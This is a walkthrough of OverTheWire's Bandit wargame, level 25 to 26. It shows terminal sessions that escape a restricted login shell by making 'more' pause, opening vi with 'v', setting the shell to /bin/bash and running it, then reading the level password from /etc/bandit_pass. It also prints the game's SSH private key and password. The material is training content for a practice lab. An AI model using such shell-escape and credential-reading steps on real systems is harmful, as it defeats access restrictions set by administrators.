# BANDIT LEVEL 25 --> LEVEL 26

```
http://overthewire.org/wargames/bandit/bandit26.html
```

### Level Goal

Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is
not /bin/bash, but something else. Find out what it is, how it works and how to break out of
it.

### Commands you may need to solve this level

```
ssh, cat, more, vi, ls, id, pwd
```

### SOLUTION

```
bandit25@bandit:~$ whoami
bandit25
bandit25@bandit:~$ pwd
/home/bandit25
bandit25@bandit:~$ ls
bandit26.sshkey
bandit25@bandit:~$ cat bandit26.sshkey
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
/5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG
xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi
1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix
3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW
qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi
il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w
e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh
Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME
zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX
c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le
wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV
tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI
2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU
i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj
6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm
pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz
JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3
JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd
1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh
ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe
euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5
/Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t
IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
-----END RSA PRIVATE KEY-----
```

Okay, so we have a `ssh` private key that will likely let us log in as `bandit26`. Let's look
into the clue about `bandit26` shell not being `/bin/bash`..

```
bandit25@bandit:~$ grep bandit26 /etc/passwd
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
```

What is `showtext`?

```
bandit25@bandit:~$ man showtext
No manual entry for showtext
See 'man 7 undocumented' for help when manual pages are not available.
bandit25@bandit:~$ /usr/bin/showtext
more: stat of /home/bandit25/text.txt failed: No such file or directory
bandit25@bandit:~$ cat /home/bandit26/text.txt
cat: /home/bandit26/text.txt: Permission denied
bandit25@bandit:~$ ls -l /home/bandit26/text.txt
-rw-r----- 1 bandit26 bandit26 258 Oct 16 14:00 /home/bandit26/text.txt
bandit25@bandit:~$ cat /usr/bin/showtext
#!/bin/sh

export TERM=linux

more ~/text.txt
exit 0
```

Looks like it is just a script that outputs the contents of the file `text.txt` in your
home directory and exits.. so we should expect that once we log in, we'll see some text and
be logged out.

```
$ ssh bandit26@bandit.labs.overthewire.org -p 2220 -i bandit26.sshkey
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

Linux bandit 4.18.12 x86_64 GNU/Linux

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

<...>

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

  _                     _ _ _   ___   __
 | |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
Connection to bandit.labs.overthewire.org closed.
```

Yup.. so how to we bypass the login `shell`?  Trying the following doesn't quite
cut it since the `/bin/bash --noprofile --norc` is passed as a command to be executed
by the default shell.. and our default shell isn't a shell at all that can run
commands.

```
$ ssh bandit26@bandit.labs.overthewire.org -p 2220 -i bandit26.sshkey -t '/bin/bash --noprofile --norc'
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

  _                     _ _ _   ___   __
 | |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
Connection to bandit.labs.overthewire.org closed.
```

So taking a closer look at the `/usr/bin/showtext` script, we see that it uses the
`more` command.  Let's take a look at the `more` manpage to see if there is anything
we can use.

```
bandit25@bandit:~$ man more
MORE(1)                            User Commands                           MORE(1)

NAME
       more - file perusal filter for crt viewing

SYNOPSIS
       more [options] file...

DESCRIPTION
       more  is  a  filter  for paging through text one screenful at a time.  This
       version is especially primitive.  Users should realize  that  less(1)  pro‐
       vides more(1) emulation plus extensive enhancements.

<...>

COMMANDS
       Interactive  commands  for  more  are based on vi(1).  Some commands may be
       preceded by a decimal number, called k in the descriptions below.   In  the
       following descriptions, ^X means control-X.

              !command or :!command
                        Execute command in a subshell.

              v         Start  up  an editor at current line.  The editor is taken
                        from the environment variable VISUAL if defined, or EDITOR
                        if  VISUAL  is  not  defined, or defaults to vi if neither
                        VISUAL nor EDITOR is defined.

<...>

ENVIRONMENT
       The more command respects the  following  environment  variables,  if  they
       exist:

       MORE   This variable may be set with favored options to more.

       SHELL  Current shell in use (normally set by the shell at login time).
```

If we resize our terminal window to be small enough so that the content of
`~/text.txt` won't fit entirely within the terminal window, `more` goes into its
"command view" and doesn't just exit immediately.

```
  _                     _ _ _   ___   __
 | |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
--More--(66%)
```

Now we can use some of the interesting commands we found in the manpage. We first
flip into the editor mode with the `v` command (which drops us into a `vi` editor
of the file)..

```
  _                     _ _ _   ___   __
 | |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
~
~
~
"~/text.txt" [readonly] 6L, 258C                                   1,3           All
```

Then we need to set the `SHELL` environment variable or it will default to our login
shell (which is `/usr/bin/showtext` and will put us back where we started).

```
  _                     _ _ _   ___   __
 | |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
~
~
~
:set shell=/bin/bash
```

And now we can execute the command `/bin/bash` to spawn a bash shell for us.

```
  _                     _ _ _   ___   __
 | |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
~
~
~
:!/bin/bash
bandit26@bandit:~$ whoami
bandit26
bandit26@bandit:~$ pwd
/home/bandit26
bandit26@bandit:~$ cat /etc/bandit_pass/bandit26
5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
```
